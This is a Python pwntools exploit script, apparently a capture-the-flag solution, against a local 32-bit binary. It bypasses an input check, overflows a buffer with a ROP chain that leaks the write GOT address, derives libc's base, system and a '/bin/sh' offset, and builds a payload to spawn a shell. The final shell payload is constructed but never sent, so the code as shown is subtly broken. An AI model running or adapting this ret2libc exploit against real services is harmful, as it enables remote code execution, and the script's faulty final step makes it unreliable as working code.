from pwn import *
#context_level='DEBUG'

p = process("./pwn")
elf = ELF("./pwn")
libc = ELF("./libc-2.23.so")

def main():

	bin_sh_off=0x0015902b
	system_off=0x0003a940

	write_plt = elf.plt['write']
	write_got = elf.got['write']
	main = 0x8048825

	payload = "\x00"
	payload += "\xff"*7

	p.sendline(payload)
	p.recvuntil("Correct\n")

	offset = 0xE7
	payload = 'A'*(offset+4)
	payload += p32(write_plt)
	payload += p32(main)
	payload += p32(1)
	payload += p32(write_got)
	payload += p32(4)

	p.sendline(payload)

	data = p.recv(4)

	write_addr = u32(data)
	log.info("Write addr: " + hex(write_addr))
	libc_base_addr = write_addr - libc.symbols['write']

	log.info("Libc addr: " + hex(libc_base_addr))
	system_addr = libc_base_addr + libc.symbols['system']

	log.info("System addr: " + hex(system_addr))
	bin_sh_addr = libc_base_addr + bin_sh_off

	payload = "\x00"
	payload += "\xff"*7

	p.sendline(payload)
	p.recvuntil("Correct\n")

	payload = 'A'*(offset+4)
	payload += p32(system_addr)
	payload += 'BBBB'
	payload += p32(bin_sh_addr)

	p.interactive()

if __name__=="__main__":
	main()
